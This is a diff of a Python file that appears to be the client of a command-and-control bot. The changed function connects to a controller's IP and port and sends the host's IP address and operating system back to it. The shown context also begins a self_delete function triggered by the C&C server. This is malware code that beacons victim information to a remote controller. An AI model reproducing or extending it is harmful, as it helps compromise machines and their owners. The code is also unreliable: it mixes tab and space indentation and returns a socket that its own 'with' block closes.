@@ -33,13 +33,13 @@ def create_client_socket(ip_addr: str, port: int):
 	"""
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock: # Initializing socket.
 		conn = (ip_addr, port) # Connect to server IP/Port.
-		sock.connect(conn) # Connection made.
+		client_sock.connect(conn) # Attempt to connect.
 		host = socket.gethostname() # Get local host name in order to then get IP.
 		client_ip = socket.gethostbyname(host) # Get local IP using host name.
-		initial_message = "IP=" + client_ip + ",os=" + system() # Send IP address and OS information.
-		sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
+		initial_message = "IP=" + client_ip + ",OS=" + system() # Send IP address and OS information.
+		client_sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
 
-    		return client_sock # Return the created client socket.
+        return client_sock # Return the created client socket.
 
 def self_delete(name: str):
     """This function will be invoked when the C&C server enter's the
